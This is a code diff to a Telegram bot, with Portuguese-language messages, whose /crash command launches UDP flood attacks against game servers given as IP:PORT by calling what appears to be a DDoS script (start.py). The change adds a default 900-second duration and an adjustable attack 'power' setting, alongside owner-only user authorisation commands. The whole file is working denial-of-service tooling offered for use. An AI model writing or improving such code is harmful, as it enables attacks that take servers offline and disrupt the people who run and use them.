@@ -44,16 +44,14 @@ def manage_attacks():
 # Comando /menu
 @bot.message_handler(commands=['menu'])
 def menu(message):
-    comandos = f"""
+    comandos = """
 Comandos disponíveis:
 
 🔹 /menu - Mostra este menu.
-🔹 /crash <IP:PORTA> <tempo> - Inicia um ataque na partida por determinado tempo.
+🔹 /crash <IP:PORTA> [tempo] - Inicia um ataque na partida por determinado tempo com potência padrão 10 (se tempo não for especificado, será 900 segundos).
 🔹 /adduser <ID> - Adiciona um usuário autorizado (apenas para o dono).
 🔹 /removeuser <ID> - Remove um usuário autorizado (apenas para o dono).
 🔹 /listusers - Lista os usuários autorizados (apenas para o dono).
-
-🔰 Criado por @werbert_ofc.
 """
     bot.send_message(message.chat.id, comandos)
 
@@ -65,20 +63,31 @@ def crash_server(message):
         return
 
     comando = message.text.split()
-    if len(comando) < 3:
-        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida> <tempo>")
+    if len(comando) < 2:
+        bot.send_message(message.chat.id, "Uso correto: /crash <IP:PORTA> [tempo]")
         return
 
     ip_porta = comando[1]
-    try:
-        tempo = int(comando[2])
-    except ValueError:
-        bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
-        return
-
     if not validar_ip_porta(ip_porta):
         bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
         return
+
+    tempo = 900  # Tempo padrão
+    potencia = 10  # Potência padrão
+
+    if len(comando) > 2:
+        try:
+            tempo = int(comando[2])
+        except ValueError:
+            bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
+            return
+
+    if len(comando) > 3:
+        try:
+            potencia = int(comando[3])
+        except ValueError:
+            bot.send_message(message.chat.id, "Por favor, insira uma potência válida.")
+            return
 
     if ip_porta in processos:
         bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
@@ -86,10 +95,10 @@ def crash_server(message):
 
     manage_attacks()
 
-    comando_ataque = ["python3", "start.py", "UDP", ip_porta, "10", str(tempo)]
+    comando_ataque = ["python3", "start.py", "UDP", ip_porta, str(potencia), str(tempo)]
     processo = subprocess.Popen(comando_ataque)
     processos[ip_porta] = processo
-    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} por {tempo} segundos.")
+    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.")
 
 # Comando /adduser e /removeuser
 @bot.message_handler(commands=['adduser', 'removeuser'])
